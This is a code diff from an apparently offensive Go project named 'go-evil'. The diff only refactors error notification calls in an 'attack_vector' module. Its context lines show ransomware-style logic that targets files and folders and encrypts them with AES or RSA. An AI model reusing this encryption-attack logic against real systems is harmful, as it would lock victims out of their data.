@@ -8,7 +8,7 @@ import (
 	enc_aes "github.com/s9rA16Bf4/go-evil/domains/algorithm/encryption/aes"
 	enc_rsa "github.com/s9rA16Bf4/go-evil/domains/algorithm/encryption/rsa"
 
-	"github.com/s9rA16Bf4/go-evil/utility/notify"
+	"github.com/s9rA16Bf4/notify_handler/go/notify"
 )
 
 // We target files, folders to encrypt
@@ -25,7 +25,7 @@ var c_target target_t
 func Encrypt_set_target(path string) { // Either a file or a folder
 	info, err := os.Stat(path)
 	if err != nil { // The target didn't exist
-		notify.Notify_error(err.Error(), "attack_vector.Encrypt_set_target()")
+		notify.Error(err.Error(), "attack_vector.Encrypt_set_target()")
 	}
 	if info.IsDir() {
 		c_target.target_type = "dir"
@@ -46,7 +46,7 @@ func Encrypt_set_encryption_method(method string) {
 		}
 	}
 	if !found {
-		notify.Notify_error("Unknown encryiption methond "+method, "attack_vector.Encrypt_set_encryption_method()")
+		notify.Error("Unknown encryiption methond "+method, "attack_vector.Encrypt_set_encryption_method()")
 	}
 
 	c_target.encryption_method = method
@@ -76,7 +76,7 @@ func Encrypt_decrypt() {
 func Encrypt_encrypt_folder(dir string) {
 	folder, err := os.Open(dir)
 	if err != nil {
-		notify.Notify_error(err.Error(), "attack_vector.Encrypt_encrypt_folder()")
+		notify.Error(err.Error(), "attack_vector.Encrypt_encrypt_folder()")
 	}
 	children, _ := folder.Readdir(0)
 	for _, child := range children {
@@ -87,7 +87,7 @@ func Encrypt_encrypt_folder(dir string) {
 func Encrypt_encrypt_file(file string) {
 	in, err := os.Open(file) // Target
 	if err != nil {
-		notify.Notify_error(err.Error(), "attack_vector.Encrypt_encrypt_file()")
+		notify.Error(err.Error(), "attack_vector.Encrypt_encrypt_file()")
 	}
 	enc_file, _ := os.Create(file + "_encrypted") // Our new file
 	// Read every line
@@ -107,7 +107,7 @@ func Encrypt_encrypt_file(file string) {
 func Encrypt_decrypt_folder(dir string) {
 	folder, err := os.Open(dir)
 	if err != nil {
-		notify.Notify_error(err.Error(), "attack_vector.Encrypt_decrypt_folder()")
+		notify.Error(err.Error(), "attack_vector.Encrypt_decrypt_folder()")
 	}
 	children, _ := folder.Readdir(0)
 	for _, child := range children {
@@ -120,7 +120,7 @@ func Encrypt_decrypt_folder(dir string) {
 func Encrypt_decrypt_file(file string) {
 	in, err := os.Open(file) // Target
 	if err != nil {
-		notify.Notify_error(err.Error(), "attack_vector.Encrypt_encrypt_file()")
+		notify.Error(err.Error(), "attack_vector.Encrypt_encrypt_file()")
 	}
 	file = strings.ReplaceAll(file, "_encrypted", "")
 	enc_file, _ := os.Create(file + "_decrypted") // Our new file
